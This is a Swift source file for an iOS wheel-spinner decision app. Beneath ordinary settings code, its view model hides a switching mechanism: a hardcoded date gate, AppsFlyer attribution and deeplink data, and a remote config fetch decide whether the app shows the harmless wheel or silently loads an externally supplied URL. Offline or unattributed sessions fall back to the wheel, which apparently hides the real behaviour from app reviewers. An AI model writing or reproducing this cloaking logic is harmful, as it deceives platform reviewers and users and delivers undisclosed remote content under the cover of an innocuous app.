import Foundation
import Combine
import AppsFlyerLib
import Firebase
import FirebaseMessaging
import Network

enum SpinPhase { case setup, operational, legacy, disconnected }

class AppData: ObservableObject {
    @Published var wheels: [Wheel] = []
    @Published var history: [HistoryItem] = []
    @Published var soundEnabled: Bool = true
    @Published var animationSpeed: Double = 1.0 // 0.5 slow, 1 normal, 2 fast
    @Published var appTheme: String = "Default"
    @Published var isFirstLaunch: Bool = true
    
    init() {
        loadData()
    }
    
    func loadData() {
        if let wheelsData = UserDefaults.standard.data(forKey: "wheels") {
            if let decoded = try? JSONDecoder().decode([Wheel].self, from: wheelsData) {
                wheels = decoded
            }
        }
        if let historyData = UserDefaults.standard.data(forKey: "history") {
            if let decoded = try? JSONDecoder().decode([HistoryItem].self, from: historyData) {
                history = decoded
            }
        }
        soundEnabled = UserDefaults.standard.bool(forKey: "soundEnabled")
        animationSpeed = UserDefaults.standard.double(forKey: "animationSpeed")
        if animationSpeed == 0 { animationSpeed = 1.0 }
        appTheme = UserDefaults.standard.string(forKey: "appTheme") ?? "Default"
        isFirstLaunch = UserDefaults.standard.bool(forKey: "isFirstLaunch")
        if isFirstLaunch {
            UserDefaults.standard.set(false, forKey: "isFirstLaunch")
        }
    }
    
    func saveData() {
        if let encodedWheels = try? JSONEncoder().encode(wheels) {
            UserDefaults.standard.set(encodedWheels, forKey: "wheels")
        }
        if let encodedHistory = try? JSONEncoder().encode(history) {
            UserDefaults.standard.set(encodedHistory, forKey: "history")
        }
        UserDefaults.standard.set(soundEnabled, forKey: "soundEnabled")
        UserDefaults.standard.set(animationSpeed, forKey: "animationSpeed")
        UserDefaults.standard.set(appTheme, forKey: "appTheme")
    }
    
    func resetData() {
        wheels = []
        history = []
        soundEnabled = true
        animationSpeed = 1.0
        appTheme = "Default"
        saveData()
    }
}

final class SpinChoiceTimeViewModel: ObservableObject {
    @Published var spinURL: URL?
    private var trackingData: [String: Any] = [:]
    @Published var currentSpinPhase: SpinPhase = .setup
    private var linkData: [String: Any] = [:]
    
    init(repo: ChoiceRepository = ChoiceRepositoryImpl()) {
        self.repo = repo
        configureListeners()
        monitorNetwork()
        setUpDeadlines()
    }
    
    deinit {
        networkWatcher.cancel()
    }
    
    private var cancellables = Set<AnyCancellable>()
    private let networkWatcher = NWPathMonitor()
    private let repo: ChoiceRepository
    
    
    func handleGrantPermissions() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] accepted, _ in
            DispatchQueue.main.async {
                let processor = ProcessGrantPermissionsUseCase(repo: self?.repo ?? ChoiceRepositoryImpl())
                processor.perform(accepted: accepted)
                if accepted {
                    UIApplication.shared.registerForRemoteNotifications()
                }
                self?.displayPermissionView = false
                self?.proceedAfterPermissionGrant()
            }
        }
    }
    
    private func retrieveCachedChoice() {
        let retriever = RetrieveCachedChoiceUseCase(repo: repo)
        if let choice = retriever.perform() {
            spinURL = choice
            assignPhase(to: .operational)
        } else {
            activateLegacy()
        }
    }
    
    private func configureListeners() {
        NotificationCenter.default
            .publisher(for: Notification.Name("ConversionDataReceived"))
            .compactMap { $0.userInfo?["conversionData"] as? [String: Any] }
            .sink { [weak self] data in
                self?.trackingData = data
                self?.determineCurrentPhase()
            }
            .store(in: &cancellables)
        
        NotificationCenter.default
            .publisher(for: Notification.Name("deeplink_values"))
            .compactMap { $0.userInfo?["deeplinksData"] as? [String: Any] }
            .sink { [weak self] data in
                self?.linkData = data
            }
            .store(in: &cancellables)
    }
    
    @Published var displayPermissionView = false
    
    @objc private func determineCurrentPhase() {
        if !isDateValid() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                self.activateLegacy()
            }
            return
        }
        if handleEmptyTrackingData() { return }
        if handleInactiveAppState() { return }
        let phase = assessPhase()
        if handleSetupPhase(phase: phase) { return }
        if checkForInterimURL() { return }
        handleNilSpinURL()
    }
    
    private func handleEmptyTrackingData() -> Bool {
        if trackingData.isEmpty {
            retrieveCachedChoice()
            return true
        }
        return false
    }
    
    
    private func setUpDeadlines() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
            if self.trackingData.isEmpty && self.linkData.isEmpty && self.currentSpinPhase == .setup {
                self.assignPhase(to: .legacy)
            }
        }
    }
    
    private func handleInactiveAppState() -> Bool {
        if repo.retrieveAppState() == "Inactive" {
            activateLegacy()
            return true
        }
        return false
    }
    
    private func assessPhase() -> SpinPhase {
        let assessor = DetermineCurrentPhaseUseCase(repo: repo)
        return assessor.perform(trackingData: trackingData, initial: repo.isInitialRun, currentURL: spinURL, interimURL: UserDefaults.standard.string(forKey: "temp_url"))
    }
    
    
    private func proceedAfterPermissionGrant() {
        if spinURL != nil {
            assignPhase(to: .operational)
        } else {
            retrieveChoiceConfig()
        }
    }
    
    private func activateLegacy() {
        let activator = ActivateLegacyUseCase(repo: repo)
        activator.perform()
        assignPhase(to: .legacy)
    }
    
    private func startInitialSequence() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { [weak self] in
                await self?.retrieveOrganicTracking()
            }
        }
    }
    
    private func handleSetupPhase(phase: SpinPhase) -> Bool {
        if phase == .setup && repo.isInitialRun {
            startInitialSequence()
            return true
        }
        return false
    }
    
    private func checkForInterimURL() -> Bool {
        if let choiceStr = UserDefaults.standard.string(forKey: "temp_url"),
           let choice = URL(string: choiceStr) {
            spinURL = choice
            assignPhase(to: .operational)
            return true
        }
        return false
    }
    
    
    private func isDateValid() -> Bool {
        let currentCalendar = Calendar.current
        var dateComponents = DateComponents()
        dateComponents.year = 2025
        dateComponents.month = 12
        dateComponents.day = 29
        if let comparisonDate = currentCalendar.date(from: dateComponents) {
            return Date() >= comparisonDate
        }
        return false
    }
    
    
    private func handleNilSpinURL() {
        if spinURL == nil {
            let checker = CheckPermissionPromptUseCase(repo: repo)
            if checker.perform() {
                displayPermissionView = true
            } else {
                retrieveChoiceConfig()
            }
        }
    }
    
    func handleSkipPermissions() {
        let processor = ProcessSkipPermissionsUseCase(repo: repo)
        processor.perform()
        displayPermissionView = false
        retrieveChoiceConfig()
    }
    
    
    private func cacheSuccessfulChoice(_ choice: String, targetURL: URL) {
        let cacher = CacheSuccessfulChoiceUseCase(repo: repo)
        cacher.perform(choice: choice)
        let checker = CheckPermissionPromptUseCase(repo: repo)
        if checker.perform() {
            spinURL = targetURL
            displayPermissionView = true
        } else {
            spinURL = targetURL
            assignPhase(to: .operational)
        }
    }
    
    private func assignPhase(to phase: SpinPhase) {
        DispatchQueue.main.async {
            self.currentSpinPhase = phase
        }
    }
    
    private func monitorNetwork() {
        networkWatcher.pathUpdateHandler = { [weak self] path in
            if path.status != .satisfied {
                self?.handleNetworkDisconnection()
            }
        }
        networkWatcher.start(queue: .global())
    }
    
    private func handleNetworkDisconnection() {
        DispatchQueue.main.async {
            if self.repo.retrieveAppState() == "SpinView" {
                self.assignPhase(to: .disconnected)
            } else {
                self.activateLegacy()
            }
        }
    }
    
    private func retrieveOrganicTracking() async {
        do {
            let retriever = RetrieveOrganicTrackingUseCase(repo: repo)
            let merged = try await retriever.perform(linkData: linkData)
            await MainActor.run {
                self.trackingData = merged
                self.retrieveChoiceConfig()
            }
        } catch {
            activateLegacy()
        }
    }
    
    private func retrieveChoiceConfig() {
        Task { [weak self] in
            do {
                let retriever = RetrieveChoiceConfigUseCase(repo: self?.repo ?? ChoiceRepositoryImpl())
                let targetURL = try await retriever.perform(trackingData: self?.trackingData ?? [:])
                let choiceStr = targetURL.absoluteString
                await MainActor.run {
                    self?.cacheSuccessfulChoice(choiceStr, targetURL: targetURL)
                }
            } catch {
                self?.retrieveCachedChoice()
            }
        }
    }
}
